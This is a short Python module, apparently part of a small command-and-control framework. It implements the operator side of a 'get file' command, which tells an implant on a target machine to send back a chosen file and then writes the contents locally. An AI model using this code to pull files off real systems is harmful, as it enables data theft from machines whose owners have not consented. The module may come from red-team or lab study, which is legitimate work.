# Patrick Sacchet
# Version 1.0
# Serves to implement interfacing with get file functionality 

SUCCESS = 1
FAILURE = 0

# Command value
GET = 2


'''
Description:
    Performs get file functionality; communicates with C2 server and handles responses
Params:
    sock - sock object with connection already established
    filepath - path to file to get off target
    outputfilepath - path to write file contents to write locally
    overwrite - whether or not to overwrite the file locally if it already exists
Returns:
    SUCCESS or FAILURE 
'''
def getFile(sock, filepath, outfilepath, overwrite):
    try:
        # First tell our implant we want a get file performed
        print("Sending command...")
        sock.send(bytes(str(GET), "utf-8") + b"\x00")

        # Send filepath
        print("Sending filepath...")
        sock.send(filepath + b'\x00')

        # Wait for response (should be success code followed by file contents)
        print("Sent data to implant; waiting on response code...")
        data = sock.recv(1024)
        data = data.strip()
        data = data.decode('utf-8')

        if (data == "SUCCESS"):
            print("Successful file get! Getting file contents...")
            data = sock.recv(1024)
            data = data.strip()
            data = data.decode('utf-8')

            # Overwrite existing file if there; otherwise, don't
            if (overwrite):
                with open(outfilepath, "w") as outputfile:
                    outputfile.write(data)
                    outputfile.close()
            else:
                with open(outfilepath, "a") as outputfile:
                    outputfile.write(data)
                    outputfile.close()

            print("Successfully wrote file contents to %s" % outfilepath)


        else:
            print("Agent did not return SUCCESS status code! ")
            return FAILURE



    except Exception as e:
        print("ERROR: Could not send get file to implant: ", e)
        return FAILURE

    return SUCCESS